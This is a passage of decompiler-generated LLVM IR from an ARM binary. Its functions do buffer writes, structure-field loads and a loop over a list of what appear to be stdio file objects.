  br i1 %v0_ed04, label %dec_label_pc_ed04..thread2_crit_edge, label %bb15

dec_label_pc_ed04..thread2_crit_edge:             ; preds = %dec_label_pc_ed04
  %v0_ed20.pre = load i32, i32* @ip, align 4
  br label %.thread2

bb15:                                             ; preds = %dec_label_pc_ed04
  %v1_ed18 = load i32, i32* %r5.global-to-local, align 4
  %v3_ed18 = add i32 %v1_ed18, 24
  %v4_ed18 = inttoptr i32 %v3_ed18 to i32*
  %v5_ed18 = load i32, i32* %v4_ed18, align 4
  store i32 %v5_ed18, i32* @ip, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ed04..thread2_crit_edge, %bb15
  %v0_ed20 = phi i32 [ %v0_ed20.pre, %dec_label_pc_ed04..thread2_crit_edge ], [ %v5_ed18, %bb15 ]
  %v2_ed20 = xor i1 %v0_ed04, true
  call void @__pseudo_cond_branch(i1 %v2_ed20, i32 %v0_ed20)
  %v0_ed24 = load i32, i32* %r4.global-to-local, align 4
  %v1_ed24 = and i32 %v0_ed24, 4
  %v2_ed2c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ed2c, i32* @r4, align 4
  ret i32 %v1_ed24

; uselistorder directives
  uselistorder i1 %v0_ed04, { 1, 0 }
  uselistorder i32 %v4_eca8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_ed04, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
}

define i32 @function_ed38(i32 %arg1) local_unnamed_addr {
dec_label_pc_ed38:
  %v0_ed38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ed38, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_ed38
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ed38, %bb
  %v10_ed44 = phi i32 [ %arg1, %dec_label_pc_ed38 ], [ 0, %bb ]
  ret i32 %v10_ed44

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_ed48(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ed48:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ed48 = load i32, i32* @r4, align 4
  store i32 %v3_ed48, i32* %stack_var_-28, align 4
  %v6_ed48 = load i32, i32* @r5, align 4
  %v9_ed48 = load i32, i32* @r6, align 4
  %v12_ed48 = load i32, i32* @r7, align 4
  %v21_ed48 = load i32, i32* @lr, align 4
  %v1_ed4c = add i32 %arg3, 52
  %v2_ed4c = inttoptr i32 %v1_ed4c to i32*
  %v3_ed4c = load i32, i32* %v2_ed4c, align 4
  %v1_ed54 = sub i32 1, %v3_ed4c
  %v2_ed54 = icmp ult i32 %v3_ed4c, 2
  br i1 %v2_ed54, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_ed48
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_ed48, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_ed54, %dec_label_pc_ed48 ]
  %v0_ed5c = phi i32 [ 0, %bb ], [ %v1_ed54, %dec_label_pc_ed48 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_ed5c = icmp eq i32 %v0_ed5c, 0
  store i32 142964, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_ed5c, label %dec_label_pc_edb0, label %dec_label_pc_ed78

dec_label_pc_ed78:                                ; preds = %bb16
  %v1_ed7c = add i32 %arg3, 56
  store i32 %v1_ed7c, i32* @r4, align 4
  %v4_ed90 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_ed90)
  %v0_eda4 = load i32, i32* @r5, align 4
  %v2_eda4 = add i32 %v0_eda4, 16
  %v3_eda4 = inttoptr i32 %v2_eda4 to i32*
  %v4_eda4 = load i32, i32* %v3_eda4, align 4
  store i32 %v4_eda4, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_edb0.362 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_eda4)
  %v0_edb0.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_edb4.pre = load i32, i32* @r7, align 4
  %v0_edb8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_edb0

dec_label_pc_edb0:                                ; preds = %bb16, %dec_label_pc_ed78
  %v0_edb8 = phi i32 [ %arg3, %bb16 ], [ %v0_edb8.pre, %dec_label_pc_ed78 ]
  %v0_edb4 = phi i32 [ %arg2, %bb16 ], [ %v0_edb4.pre, %dec_label_pc_ed78 ]
  %v0_edb0 = phi i32 [ %arg1, %bb16 ], [ %v0_edb0.pre, %dec_label_pc_ed78 ]
  %v3_edbc = inttoptr i32 %v0_edb0 to i8*
  %v4_edbc = call i32 @function_f340(i8* %v3_edbc, i32 %v0_edb4, i32 %v0_edb8)
  %v0_edc0 = load i32, i32* %sl.global-to-local, align 4
  %v2_edc0 = icmp eq i32 %v0_edc0, 0
  store i32 %v4_edbc, i32* %r4.global-to-local, align 4
  br i1 %v2_edc0, label %dec_label_pc_edb0..thread3_crit_edge, label %bb17

dec_label_pc_edb0..thread3_crit_edge:             ; preds = %dec_label_pc_edb0
  %v0_eddc.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_edb0
  %v1_edd4 = load i32, i32* @r5, align 4
  %v3_edd4 = add i32 %v1_edd4, 24
  %v4_edd4 = inttoptr i32 %v3_edd4 to i32*
  %v5_edd4 = load i32, i32* %v4_edd4, align 4
  store i32 %v5_edd4, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_edb0..thread3_crit_edge, %bb17
  %v0_eddc = phi i32 [ %v0_eddc.pre, %dec_label_pc_edb0..thread3_crit_edge ], [ %v5_edd4, %bb17 ]
  %v2_eddc = xor i1 %v2_edc0, true
  call void @__pseudo_cond_branch(i1 %v2_eddc, i32 %v0_eddc)
  %v0_ede0 = load i32, i32* %r4.global-to-local, align 4
  %v2_ede8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_ede8, i32* @r4, align 4
  store i32 %v6_ed48, i32* @r5, align 4
  store i32 %v9_ed48, i32* @r6, align 4
  store i32 %v12_ed48, i32* @r7, align 4
  store i32 %v21_ed48, i32* @lr, align 4
  ret i32 %v0_ede0

; uselistorder directives
  uselistorder i32 %v3_ed4c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_edb0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_edf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_edf4:
  %v0_edf4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_edf4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_edf4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_edf4, %bb
  %v10_ee00 = phi i32 [ %arg1, %dec_label_pc_edf4 ], [ 0, %bb ]
  ret i32 %v10_ee00

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_ee04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ee04:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_ee04 = load i32, i32* @r4, align 4
  store i32 %v3_ee04, i32* %stack_var_-20, align 4
  %v6_ee04 = load i32, i32* @r5, align 4
  %v9_ee04 = load i32, i32* @r6, align 4
  %v12_ee04 = load i32, i32* @r7, align 4
  %v15_ee04 = load i32, i32* @lr, align 4
  %v1_ee08 = add i32 %arg2, 52
  %v2_ee08 = inttoptr i32 %v1_ee08 to i32*
  %v3_ee08 = load i32, i32* %v2_ee08, align 4
  store i32 %v3_ee08, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee10 = icmp eq i32 %v3_ee08, 0
  store i32 142964, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_ee10, label %dec_label_pc_ee54, label %dec_label_pc_ee28

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ee04
  %v1_ee28 = add i32 %arg2, 16
  %v2_ee28 = inttoptr i32 %v1_ee28 to i32*
  %v3_ee28 = load i32, i32* %v2_ee28, align 4
  store i32 %v3_ee28, i32* %r2.global-to-local, align 4
  %v1_ee2c = add i32 %arg2, 28
  %v2_ee2c = inttoptr i32 %v1_ee2c to i32*
  %v3_ee2c = load i32, i32* %v2_ee2c, align 4
  store i32 %v3_ee2c, i32* %r3.global-to-local, align 4
  %v3_ee30 = icmp uge i32 %v3_ee28, %v3_ee2c
  store i1 %v3_ee30, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_ee30, label %dec_label_pc_ee28.dec_label_pc_ee48_crit_edge, label %.thread

dec_label_pc_ee28.dec_label_pc_ee48_crit_edge:    ; preds = %dec_label_pc_ee28
  %.pre = trunc i32 %arg1 to i8
  br label %dec_label_pc_ee48

.thread:                                          ; preds = %dec_label_pc_ee28
  %v2_ee34 = urem i32 %arg1, 256
  store i32 %v2_ee34, i32* %r3.global-to-local, align 4
  %v2_ee38 = trunc i32 %arg1 to i8
  %v4_ee38 = inttoptr i32 %v3_ee28 to i8*
  store i8 %v2_ee38, i8* %v4_ee38, align 1
  %v5_ee38 = load i32, i32* %r2.global-to-local, align 4
  %v6_ee38 = add i32 %v5_ee38, 1
  store i32 %v6_ee38, i32* %r2.global-to-local, align 4
  %v0_ee3c.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ee3c.pr.pr, label %dec_label_pc_ee48, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_ee3c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_ee3c, i32* %r4.global-to-local, align 4
  store i32 %v6_ee38, i32* %v2_ee28, align 4
  br label %dec_label_pc_eed4

dec_label_pc_ee48:                                ; preds = %dec_label_pc_ee28.dec_label_pc_ee48_crit_edge, %.thread
  %v2_ee48.pre-phi = phi i8 [ %.pre, %dec_label_pc_ee28.dec_label_pc_ee48_crit_edge ], [ %v2_ee38, %.thread ]
  %v3_ee48 = call i32 @function_f3e0(i8 %v2_ee48.pre-phi, i32 %arg2)
  store i32 %v3_ee48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eed4

dec_label_pc_ee54:                                ; preds = %dec_label_pc_ee04
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_ee58 = add i32 %arg2, 56
  store i32 %v1_ee58, i32* @r4, align 4
  store i32 %v1_ee58, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_ee6c = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_ee6c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_ee80 = load i32, i32* @r6, align 4
  %v2_ee80 = add i32 %v0_ee80, 16
  %v3_ee80 = inttoptr i32 %v2_ee80 to i32*
  %v4_ee80 = load i32, i32* %v3_ee80, align 4
  store i32 61068, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_ee80)
  %v0_ee8c = load i32, i32* @r5, align 4
  %v1_ee8c = add i32 %v0_ee8c, 16
  %v2_ee8c = inttoptr i32 %v1_ee8c to i32*
  %v3_ee8c = load i32, i32* %v2_ee8c, align 4
  store i32 %v3_ee8c, i32* %r2.global-to-local, align 4
  %v1_ee90 = add i32 %v0_ee8c, 28
  %v2_ee90 = inttoptr i32 %v1_ee90 to i32*
  %v3_ee90 = load i32, i32* %v2_ee90, align 4
  store i32 %v3_ee90, i32* %r3.global-to-local, align 4
  %v3_ee94 = icmp uge i32 %v3_ee8c, %v3_ee90
  store i1 %v3_ee94, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_ee94, label %dec_label_pc_eeac, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_ee54
  %v1_ee98 = load i32, i32* @r7, align 4
  %v2_ee98 = urem i32 %v1_ee98, 256
  store i32 %v2_ee98, i32* %r3.global-to-local, align 4
  %v2_ee9c = trunc i32 %v1_ee98 to i8
  %v4_ee9c = inttoptr i32 %v3_ee8c to i8*
  store i8 %v2_ee9c, i8* %v4_ee9c, align 1
  %v5_ee9c = load i32, i32* %r2.global-to-local, align 4
  %v6_ee9c = add i32 %v5_ee9c, 1
  store i32 %v6_ee9c, i32* %r2.global-to-local, align 4
  %v0_eea0.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_eea0.pr.pr, label %.thread4.dec_label_pc_eeac_crit_edge, label %.thread6

.thread4.dec_label_pc_eeac_crit_edge:             ; preds = %.thread4
  %v0_eeb0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_eeac

.thread6:                                         ; preds = %.thread4
  %v1_eea0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_eea0, i32* %r4.global-to-local, align 4
  %v2_eea4 = load i32, i32* @r5, align 4
  %v3_eea4 = add i32 %v2_eea4, 16
  %v4_eea4 = inttoptr i32 %v3_eea4 to i32*
  store i32 %v6_ee9c, i32* %v4_eea4, align 4
  br label %dec_label_pc_eebc

dec_label_pc_eeac:                                ; preds = %.thread4.dec_label_pc_eeac_crit_edge, %dec_label_pc_ee54
  %v0_eeb0 = phi i32 [ %v0_eeb0.pre, %.thread4.dec_label_pc_eeac_crit_edge ], [ %v0_ee8c, %dec_label_pc_ee54 ]
  %v0_eeac = load i32, i32* @r7, align 4
  %v2_eeb4 = trunc i32 %v0_eeac to i8
  %v3_eeb4 = call i32 @function_f3e0(i8 %v2_eeb4, i32 %v0_eeb0)
  store i32 %v3_eeb4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %.thread6, %dec_label_pc_eeac
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_eec8 = load i32, i32* @r6, align 4
  %v2_eec8 = add i32 %v0_eec8, 24
  %v3_eec8 = inttoptr i32 %v2_eec8 to i32*
  %v4_eec8 = load i32, i32* %v3_eec8, align 4
  call void @__pseudo_branch(i32 %v4_eec8)
  br label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %.thread2, %dec_label_pc_ee48, %dec_label_pc_eebc
  %v0_eed4 = load i32, i32* %r4.global-to-local, align 4
  %v2_eedc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_eedc, i32* @r4, align 4
  store i32 %v6_ee04, i32* @r5, align 4
  store i32 %v9_ee04, i32* @r6, align 4
  store i32 %v12_ee04, i32* @r7, align 4
  store i32 %v15_ee04, i32* @lr, align 4
  ret i32 %v0_eed4

; uselistorder directives
  uselistorder i32 %v1_ee98, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_eed4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_eebc, { 1, 0 }
  uselistorder label %dec_label_pc_ee48, { 1, 0 }
}

define i32 @function_eee8(i32 %arg1) local_unnamed_addr {
dec_label_pc_eee8:
  %v0_eee8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_eee8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_eee8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_eee8, %bb
  %v10_eef4 = phi i32 [ %arg1, %dec_label_pc_eee8 ], [ 0, %bb ]
  ret i32 %v10_eef4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_eef8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_eef8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_eef8 = load i32, i32* @r4, align 4
  store i32 %v3_eef8, i32* %stack_var_-24, align 4
  %v6_eef8 = load i32, i32* @r5, align 4
  %v9_eef8 = load i32, i32* @r6, align 4
  %v12_eef8 = load i32, i32* @r7, align 4
  %v15_eef8 = load i32, i32* @r8, align 4
  %v18_eef8 = load i32, i32* @lr, align 4
  %v1_eefc = add i32 %arg2, 52
  %v2_eefc = inttoptr i32 %v1_eefc to i32*
  %v3_eefc = load i32, i32* %v2_eefc, align 4
  %v1_ef04 = sub i32 1, %v3_eefc
  %v2_ef04 = icmp ult i32 %v3_eefc, 2
  br i1 %v2_ef04, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_eef8
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_eef8, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_ef04, %dec_label_pc_eef8 ]
  %v0_ef0c = phi i32 [ 0, %bb ], [ %v1_ef04, %dec_label_pc_eef8 ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_ef0c = icmp eq i32 %v0_ef0c, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 142964, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_ef0c, label %dec_label_pc_ef5c, label %dec_label_pc_ef24

dec_label_pc_ef24:                                ; preds = %bb14
  %v1_ef28 = add i32 %arg2, 56
  store i32 %v1_ef28, i32* @r4, align 4
  %v4_ef3c = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_ef3c)
  %v0_ef50 = load i32, i32* @r5, align 4
  %v2_ef50 = add i32 %v0_ef50, 16
  %v3_ef50 = inttoptr i32 %v2_ef50 to i32*
  %v4_ef50 = load i32, i32* %v3_ef50, align 4
  store i32 %v4_ef50, i32* @ip, align 4
  store i32 61276, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_ef50)
  %v0_ef5c.pre = load i32, i32* @r7, align 4
  %v0_ef60.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %bb14, %dec_label_pc_ef24
  %v0_ef60 = phi i32 [ %arg2, %bb14 ], [ %v0_ef60.pre, %dec_label_pc_ef24 ]
  %v0_ef5c = phi i32 [ %arg1, %bb14 ], [ %v0_ef5c.pre, %dec_label_pc_ef24 ]
  %v2_ef64 = call i32 @function_f4e8(i32 %v0_ef5c, i32 %v0_ef60)
  %v0_ef68 = load i32, i32* @r8, align 4
  %v2_ef68 = icmp eq i32 %v0_ef68, 0
  store i32 %v2_ef64, i32* %r4.global-to-local, align 4
  br i1 %v2_ef68, label %dec_label_pc_ef5c..thread3_crit_edge, label %bb15

dec_label_pc_ef5c..thread3_crit_edge:             ; preds = %dec_label_pc_ef5c
  br label %.thread3

bb15:                                             ; preds = %dec_label_pc_ef5c
  %v1_ef7c = load i32, i32* @r5, align 4
  %v3_ef7c = add i32 %v1_ef7c, 24
  %v4_ef7c = inttoptr i32 %v3_ef7c to i32*
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_ef5c..thread3_crit_edge, %bb15
  %v0_ef84.in = phi i32* [ @ip, %dec_label_pc_ef5c..thread3_crit_edge ], [ %v4_ef7c, %bb15 ]
  %v0_ef84 = load i32, i32* %v0_ef84.in, align 4
  %v2_ef84 = xor i1 %v2_ef68, true
  call void @__pseudo_cond_branch(i1 %v2_ef84, i32 %v0_ef84)
  %v0_ef88 = load i32, i32* %r4.global-to-local, align 4
  %v2_ef90 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_ef90, i32* @r4, align 4
  store i32 %v6_eef8, i32* @r5, align 4
  store i32 %v9_eef8, i32* @r6, align 4
  store i32 %v12_eef8, i32* @r7, align 4
  store i32 %v15_eef8, i32* @r8, align 4
  store i32 %v18_eef8, i32* @lr, align 4
  ret i32 %v0_ef88

; uselistorder directives
  uselistorder i32 %v3_eefc, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_f4e8, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_ef5c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
}

define i32 @function_ef9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_ef9c:
  %v0_ef9c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ef9c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_ef9c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_ef9c, %bb
  %v10_efa8 = phi i32 [ %arg1, %dec_label_pc_ef9c ], [ 0, %bb ]
  ret i32 %v10_efa8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_efac() local_unnamed_addr {
dec_label_pc_efac:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_efac = load i32, i32* @r4, align 4
  store i32 %v3_efac, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r6.global-to-local, align 4
  %v4_efbc = load i32, i32* inttoptr (i32 143000 to i32*), align 8
  store i32 %v4_efbc, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_efc4 = load i32, i32* inttoptr (i32 143076 to i32*), align 4
  store i32 %v4_efc4, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_efd0 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  store i32 %v4_efd0, i32* %r7.global-to-local, align 4
  %v2_efdc = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_efd0)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_eff0 = load i32, i32* %r6.global-to-local, align 4
  %v2_eff0 = add i32 %v0_eff0, 16
  %v3_eff0 = inttoptr i32 %v2_eff0 to i32*
  %v4_eff0 = load i32, i32* %v3_eff0, align 4
  store i32 %v4_eff0, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_eff0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_f000 = load i32, i32* %r6.global-to-local, align 4
  %v2_f000 = add i32 %v0_f000, 12
  %v3_f000 = inttoptr i32 %v2_f000 to i32*
  %v4_f000 = load i32, i32* %v3_f000, align 4
  store i32 %v4_f000, i32* %r3.global-to-local, align 4
  %v1_f004 = inttoptr i32 %v4_f000 to i32*
  %v2_f004 = load i32, i32* %v1_f004, align 4
  store i32 %v2_f004, i32* %r3.global-to-local, align 4
  %v7_f008 = icmp eq i32 %v2_f004, 1
  br i1 %v7_f008, label %dec_label_pc_f010, label %dec_label_pc_f0d0

dec_label_pc_f010:                                ; preds = %dec_label_pc_efac
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_f014 = add i32 %v0_f000, 52
  %v3_f014 = inttoptr i32 %v2_f014 to i32*
  %v4_f014 = load i32, i32* %v3_f014, align 4
  store i32 %v4_f014, i32* %r3.global-to-local, align 4
  %v1_f018 = inttoptr i32 %v4_f014 to i32*
  %v2_f018 = load i32, i32* %v1_f018, align 4
  store i32 %v2_f018, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_f018, 1
  br i1 %tmp30, label %dec_label_pc_f0d0, label %dec_label_pc_f024

dec_label_pc_f024:                                ; preds = %dec_label_pc_f010
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_f028 = add i32 %v0_f000, 100
  %v3_f028 = inttoptr i32 %v2_f028 to i32*
  %v4_f028 = load i32, i32* %v3_f028, align 4
  store i32 %v4_f028, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_efd0)
  call void @__pseudo_branch(i32 %v4_eff0)
  %v0_f050 = load i32, i32* %r6.global-to-local, align 4
  %v2_f050 = add i32 %v0_f050, 48
  %v3_f050 = inttoptr i32 %v2_f050 to i32*
  %v4_f050 = load i32, i32* %v3_f050, align 4
  store i32 %v4_f050, i32* %r3.global-to-local, align 4
  %v1_f054 = inttoptr i32 %v4_f050 to i32*
  %v2_f054 = load i32, i32* %v1_f054, align 4
  store i32 %v2_f054, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_f0a011 = icmp eq i32 %v2_f054, 0
  br i1 %v2_f0a011, label %dec_label_pc_f0ac, label %dec_label_pc_f064

dec_label_pc_f064:                                ; preds = %dec_label_pc_f024, %dec_label_pc_f09c
  %v0_f0882 = phi i32 [ %v0_f09c, %dec_label_pc_f09c ], [ %v2_f054, %dec_label_pc_f024 ]
  %v1_f064 = inttoptr i32 %v0_f0882 to i16*
  %v2_f064 = load i16, i16* %v1_f064, align 2
  %v3_f064 = zext i16 %v2_f064 to i32
  store i32 %v3_f064, i32* %r3.global-to-local, align 4
  %v2_f068 = and i32 %v3_f064, 32816
  %v7_f06c = icmp eq i32 %v2_f068, 48
  %v1_f070 = add i32 %v0_f0882, 32
  %v2_f070 = inttoptr i32 %v1_f070 to i32*
  %v3_f070 = load i32, i32* %v2_f070, align 4
  store i32 %v3_f070, i32* %r5.global-to-local, align 4
  br i1 %v7_f06c, label %dec_label_pc_f07c, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_f064
  store i32 %v0_f0882, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f09c

dec_label_pc_f07c:                                ; preds = %dec_label_pc_f064
  %v0_f07c = load i32, i32* %r7.global-to-local, align 4
  %v2_f07c = icmp eq i32 %v0_f07c, 0
  br i1 %v2_f07c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_f07c
  %v1_f080 = load i32, i32* %r6.global-to-local, align 4
  %v2_f080 = load i32, i32* %r8.global-to-local, align 4
  %v3_f080 = add i32 %v2_f080, %v1_f080
  %v4_f080 = inttoptr i32 %v3_f080 to i32*
  %v5_f080 = load i32, i32* %v4_f080, align 4
  store i32 %v5_f080, i32* %r3.global-to-local, align 4
  %v3_f084 = inttoptr i32 %v5_f080 to i32*
  store i32 %v3_f070, i32* %v3_f084, align 4
  %v0_f088 = load i32, i32* %r4.global-to-local, align 4
  %v1_f088 = inttoptr i32 %v0_f088 to i16*
  %v2_f088 = load i16, i16* %v1_f088, align 2
  %v3_f088 = zext i16 %v2_f088 to i32
  store i32 %v3_f088, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_f07c
  %v2_f0888 = load i16, i16* %v1_f064, align 2
  %v3_f0889 = zext i16 %v2_f0888 to i32
  store i32 %v3_f0889, i32* %r3.global-to-local, align 4
  %v3_f08c = add i32 %v0_f07c, 32
  %v4_f08c = inttoptr i32 %v3_f08c to i32*
  store i32 %v3_f070, i32* %v4_f08c, align 4
  %v0_f090.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_f090 = phi i32 [ %v3_f088, %.thread ], [ %v0_f090.pre, %bb ]
  %v1_f090 = and i32 %v0_f090, 8192
  %v2_f090 = icmp eq i32 %v1_f090, 0
  br i1 %v2_f090, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_f098 = xor i1 %v2_f090, true
  call void @__pseudo_cond_branch(i1 %v1_f098, i32 ptrtoint (i32* @global_var_11048.271 to i32))
  %v0_f09c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %.thread21, %bb33
  %v0_f09c = phi i32 [ %v0_f09c.pre, %bb33 ], [ %v3_f070, %.thread21 ]
  store i32 %v0_f09c, i32* %r4.global-to-local, align 4
  %v2_f0a0 = icmp eq i32 %v0_f09c, 0
  br i1 %v2_f0a0, label %dec_label_pc_f0a0.dec_label_pc_f0ac_crit_edge, label %dec_label_pc_f064

dec_label_pc_f0a0.dec_label_pc_f0ac_crit_edge:    ; preds = %dec_label_pc_f09c
  %v0_f0b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %dec_label_pc_f0a0.dec_label_pc_f0ac_crit_edge, %dec_label_pc_f024
  %v0_f0b8 = phi i32 [ %v0_f0b8.pre, %dec_label_pc_f0a0.dec_label_pc_f0ac_crit_edge ], [ %v0_f050, %dec_label_pc_f024 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_f0b8 = add i32 %v0_f0b8, 24
  %v3_f0b8 = inttoptr i32 %v2_f0b8 to i32*
  %v4_f0b8 = load i32, i32* %v3_f0b8, align 4
  call void @__pseudo_branch(i32 %v4_f0b8)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_f0c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_f0c8 = add i32 %v0_f0c8, 52
  %v3_f0c8 = inttoptr i32 %v2_f0c8 to i32*
  %v4_f0c8 = load i32, i32* %v3_f0c8, align 4
  store i32 %v4_f0c8, i32* %r3.global-to-local, align 4
  %v0_f0cc = load i32, i32* %r4.global-to-local, align 4
  %v2_f0cc = inttoptr i32 %v4_f0c8 to i32*
  store i32 %v0_f0cc, i32* %v2_f0cc, align 4
  %v0_f0d4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f0d0

